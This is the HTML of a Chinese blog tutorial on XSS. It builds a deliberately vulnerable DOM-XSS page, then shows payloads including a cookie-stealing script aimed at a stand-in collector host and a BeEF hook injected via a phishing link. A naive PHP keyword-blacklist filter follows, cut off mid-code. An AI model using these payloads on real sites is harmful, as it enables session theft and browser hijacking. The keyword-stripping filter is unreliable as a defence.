@@ -1,0 +1,1151 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/uploads/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/uploads/favicon.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="web安全之XSS漏洞学习实战1.编写一个存在XSS漏洞的页面编写一个dom形xss。首先html页面： 123456789101112131415&amp;lt;!DOCTYPE html&amp;gt;&amp;lt;html lang=&quot;zh-CN&quot;&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;DOMXSS&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;H2&amp;gt;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Darren-学无止境">
+<meta property="og:url" content="http://yoursite.com/2020/03/24/web安全之XSS漏洞学习实战/index.html">
+<meta property="og:site_name" content="Darren-学无止境">
+<meta property="og:description" content="web安全之XSS漏洞学习实战1.编写一个存在XSS漏洞的页面编写一个dom形xss。首先html页面： 123456789101112131415&amp;lt;!DOCTYPE html&amp;gt;&amp;lt;html lang=&quot;zh-CN&quot;&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;DOMXSS&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;H2&amp;gt;">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1578539018013.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1578540177735.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1578540339135.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1578540669070.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1578540698882.png">
+<meta property="og:updated_time" content="2020-03-24T07:48:55.889Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Darren-学无止境">
+<meta name="twitter:description" content="web安全之XSS漏洞学习实战1.编写一个存在XSS漏洞的页面编写一个dom形xss。首先html页面： 123456789101112131415&amp;lt;!DOCTYPE html&amp;gt;&amp;lt;html lang=&quot;zh-CN&quot;&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;DOMXSS&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;H2&amp;gt;">
+<meta name="twitter:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1578539018013.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/03/24/web安全之XSS漏洞学习实战/">
+
+
+
+
+
+  <title> | Darren-学无止境</title>
+  
+
+
+
+
+
+
+
+
+
+  <script>
+class Circle {
+    //创建对象
+    //以一个圆为对象
+    //设置随机的 x，y坐标，r半径，_mx，_my移动的距离
+    //this.r是创建圆的半径，参数越大半径越大
+    //this._mx,this._my是移动的距离，参数越大移动
+    constructor(x, y) {
+        this.x = x;
+        this.y = y;
+        this.r = Math.random() * 10 ;
+        this._mx = Math.random() ;
+        this._my = Math.random() ;
+
+    }
+
+    //canvas 画圆和画直线
+    //画圆就是正常的用canvas画一个圆
+    //画直线是两个圆连线，为了避免直线过多，给圆圈距离设置了一个值，距离很远的圆圈，就不做连线处理
+    drawCircle(ctx) {
+        ctx.beginPath();
+        //arc() 方法使用一个中心点和半径，为一个画布的当前子路径添加一条弧。
+        ctx.arc(this.x, this.y, this.r, 0, 360)
+        ctx.closePath();
+        ctx.fillStyle = 'rgba(204, 204, 204, 0.3)';
+        ctx.fill();
+    }
+
+    drawLine(ctx, _circle) {
+        let dx = this.x - _circle.x;
+        let dy = this.y - _circle.y;
+        let d = Math.sqrt(dx * dx + dy * dy)
+        if (d < 150) {
+            ctx.beginPath();
+            //开始一条路径，移动到位置 this.x,this.y。创建到达位置 _circle.x,_circle.y 的一条线：
+            ctx.moveTo(this.x, this.y);   //起始点
+            ctx.lineTo(_circle.x, _circle.y);   //终点
+            ctx.closePath();
+            ctx.strokeStyle = 'rgba(204, 204, 204, 0.3)';
+            ctx.stroke();
+        }
+    }
+
+    // 圆圈移动
+    // 圆圈移动的距离必须在屏幕范围内
+    move(w, h) {
+        this._mx = (this.x < w && this.x > 0) ? this._mx : (-this._mx);
+        this._my = (this.y < h && this.y > 0) ? this._my : (-this._my);
+        this.x += this._mx / 2;
+        this.y += this._my / 2;
+    }
+}
+//鼠标点画圆闪烁变动
+class currentCirle extends Circle {
+    constructor(x, y) {
+        super(x, y)
+    }
+
+    drawCircle(ctx) {
+        ctx.beginPath();
+        //注释内容为鼠标焦点的地方圆圈半径变化
+        //this.r = (this.r < 14 && this.r > 1) ? this.r + (Math.random() * 2 - 1) : 2;
+        this.r = 8;
+        ctx.arc(this.x, this.y, this.r, 0, 360);
+        ctx.closePath();
+        //ctx.fillStyle = 'rgba(0,0,0,' + (parseInt(Math.random() * 100) / 100) + ')'
+        ctx.fillStyle = 'rgba(255, 77, 54, 0.3)'
+        ctx.fill();
+
+    }
+}
+//更新页面用requestAnimationFrame替代setTimeout
+window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame || window.msRequestAnimationFrame;
+
+let canvas = document.getElementById('canvas');
+let ctx = canvas.getContext('2d');
+let w = canvas.width = canvas.offsetWidth;
+let h = canvas.height = canvas.offsetHeight;
+let circles = [];
+let current_circle = new currentCirle(0, 0)
+
+let draw = function () {
+    ctx.clearRect(0, 0, w, h);
+    for (let i = 0; i < circles.length; i++) {
+        circles[i].move(w, h);
+        circles[i].drawCircle(ctx);
+        for (j = i + 1; j < circles.length; j++) {
+            circles[i].drawLine(ctx, circles[j])
+        }
+    }
+    if (current_circle.x) {
+        current_circle.drawCircle(ctx);
+        for (var k = 1; k < circles.length; k++) {
+            current_circle.drawLine(ctx, circles[k])
+        }
+    }
+    requestAnimationFrame(draw)
+}
+
+let init = function (num) {
+    for (var i = 0; i < num; i++) {
+        circles.push(new Circle(Math.random() * w, Math.random() * h));
+    }
+    draw();
+}
+window.addEventListener('load', init(60));
+window.onmousemove = function (e) {
+    e = e || window.event;
+    current_circle.x = e.clientX;
+    current_circle.y = e.clientY;
+}
+window.onmouseout = function () {
+    current_circle.x = null;
+    current_circle.y = null;
+
+};
+</script>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+<a href="https://github.com/Darren-zl"><img style="position: absolute; top: 0; left: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_left_gray_6d6d6d.png" alt="Fork me on GitHub"></a>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Darren-学无止境</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">一天一小步，随着时间的积累，你将会发现你其实已经走了很远。</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-message">
+          <a href="/message/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heart"></i> <br>
+            
+            留言板
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-photo">
+          <a href="/photo/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-image"></i> <br>
+            
+            摄影
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-music">
+          <a href="/music/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-music"></i> <br>
+            
+            音乐
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-welfare">
+          <a href="/welfare/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-leaf"></i> <br>
+            
+            福利
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-book">
+          <a href="/book/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-book"></i> <br>
+            
+            书单
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/24/web安全之XSS漏洞学习实战/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Darren-zl">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Darren-学无止境">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline"></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-03-24T14:57:52+08:00">
+                2020-03-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+              <span class="post-meta-divider">|</span>
+              <span class="post-meta-item-icon">
+                <i class="fa fa-comment-o"></i>
+              </span>
+              
+                <a href="/2020/03/24/web安全之XSS漏洞学习实战/#SOHUCS" itemprop="discussionUrl">
+                  <span id="changyan_count_unit" class="post-comments-count hc-comment-count" data-xid="2020/03/24/web安全之XSS漏洞学习实战/" itemprop="commentsCount"></span>
+                </a>
+              
+            
+          
+
+          
+          
+             <span id="/2020/03/24/web安全之XSS漏洞学习实战/" class="leancloud_visitors" data-flag-title>
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Visitors&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </span></div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+      
+      
+
+      
+        <h2 id="web安全之XSS漏洞学习实战"><a href="#web安全之XSS漏洞学习实战" class="headerlink" title="web安全之XSS漏洞学习实战"></a>web安全之XSS漏洞学习实战</h2><h3 id="1-编写一个存在XSS漏洞的页面"><a href="#1-编写一个存在XSS漏洞的页面" class="headerlink" title="1.编写一个存在XSS漏洞的页面"></a>1.编写一个存在XSS漏洞的页面</h3><p>编写一个dom形xss。首先html页面：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"zh-CN"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>DOMXSS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">H2</span>&gt;</span>DOMXSS<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">	<span class="keyword">var</span> pos=<span class="built_in">document</span>.URL.indexOf(<span class="string">"name="</span>)+<span class="number">5</span>;</span></span><br><span class="line"><span class="javascript">	<span class="built_in">document</span>.write(<span class="built_in">decodeURI</span>(<span class="built_in">document</span>.URL.substring(pos,<span class="built_in">document</span>.URL.length))); </span></span><br><span class="line"><span class="javascript"><span class="comment">//1.document.URL表示返回当前页面的URL   2.indexOf表示回某个指定的字符串值在字符串中首次出现的位置。   pos=74(url长度)+5</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//1.document.write表示输出内容  2.decodeURI() 函数可对 encodeURI() 函数编码过的 URI 进行解码，decodeURI为解码。 </span></span></span><br><span class="line"><span class="javascript"><span class="comment">//3.substring() 方法用于提取字符串中介于两个指定下标之间的字符。substring() 方法返回的子串包括 开始 处的字符，但不包括 结束 处的字符。</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>验证：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1578539018013.png" alt="1578539018013"></p>
+<h3 id="2-利用XSS"><a href="#2-利用XSS" class="headerlink" title="2.利用XSS"></a>2.利用XSS</h3><p>存在xss漏洞的页面上只需</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>便可以获取到当前用户的cookie。</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1578540177735.png" alt="1578540177735"></p>
+<p>如果对方漏洞为存储型XSS，并且你搭建了xss获取cookie的平台那么只需将下面代码插入漏洞页面中，便可以在cookie平台中获取到对方的cookie。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.open(<span class="string">'http://xss/cookie.asp?msg='</span>+<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-利用XSS漏洞还可以做什么。"><a href="#3-利用XSS漏洞还可以做什么。" class="headerlink" title="3.利用XSS漏洞还可以做什么。"></a>3.利用XSS漏洞还可以做什么。</h3><p>3.1 可以在beef上把目标的浏览器作为代理进行操作，可以进行DNS污染等等。</p>
+<p>3.2 可以利用mitmf结合社会工程学使用户接受Social Engineering中的模块，让用户安装.exe等更新软件获取shell。</p>
+<p>3.3 结合metasploit进一步获取权限。</p>
+<p>首先在Beef里构造一个存在漏洞的页面，如下：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1578540339135.png" alt="1578540339135"></p>
+<p>然后利用邮件钓鱼等多种方式诱导用户访问含有XSS漏洞页面：</p>
+<p>如： <a href="http://127.0.0.1/domxss.html?name=" target="_blank" rel="noopener">http://127.0.0.1/domxss.html?name=</a><script src="http://192.168.5.54:3000/hook.js"></script></p>
+<p>用户点击以后便直接上线：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1578540669070.png" alt="1578540669070"></p>
+<p>然后就可以做很多事件：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1578540698882.png" alt="1578540698882"></p>
+<h3 id="4-如何防御XSS"><a href="#4-如何防御XSS" class="headerlink" title="4.如何防御XSS"></a>4.如何防御XSS</h3><p>xss的防御主要还是集中在代码层，需要过滤非法字符。需要对输入内容进行过滤，输出内容进行编码。</p>
+<p>针对php可以用如下代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($str)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    $str = htmlspecialchars($str);</span><br><span class="line">    $str = str_replace( <span class="string">'/'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'"'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'('</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">')'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'CR'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'ASCII'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'ASCII 0x0d'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'LF'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'ASCII 0x0a'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">','</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'%'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">';'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'eval'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'open'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'sysopen'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'system'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'$'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">"'"</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">"'"</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'ASCII 0x08'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'"'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'"'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace(<span class="string">""</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace(<span class="string">"&amp;gt"</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace(<span class="string">"&amp;lt"</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace(<span class="string">"&lt;SCRIPT&gt;"</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace(<span class="string">"&lt;/SCRIPT&gt;"</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace(<span class="string">"&lt;script&gt;"</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace(<span class="string">"&lt;/script&gt;"</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace(<span class="string">"select"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"join"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"union"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"where"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"insert"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"delete"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"update"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"like"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"drop"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"DROP"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"create"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"modify"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"rename"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"alter"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"cas"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&amp;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">" "</span>,chr(<span class="number">32</span>),$str);</span><br><span class="line">    $str = str_replace(<span class="string">" "</span>,chr(<span class="number">9</span>),$str);</span><br><span class="line">    $str = str_replace(<span class="string">"    "</span>,chr(<span class="number">9</span>),$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&amp;"</span>,chr(<span class="number">34</span>),$str);</span><br><span class="line">    $str = str_replace(<span class="string">"'"</span>,chr(<span class="number">39</span>),$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&lt;br /&gt;"</span>,chr(<span class="number">13</span>),$str);</span><br><span class="line">    $str = str_replace(<span class="string">"''"</span>,<span class="string">"'"</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"css"</span>,<span class="string">"'"</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"CSS"</span>,<span class="string">"'"</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&lt;!--"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"convert"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"md5"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"passwd"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"password"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"../"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"./"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"Array"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"or 1='1'"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">";set|set&amp;set;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"`set|set&amp;set`"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"--"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"OR"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">'"'</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"*"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"-"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span 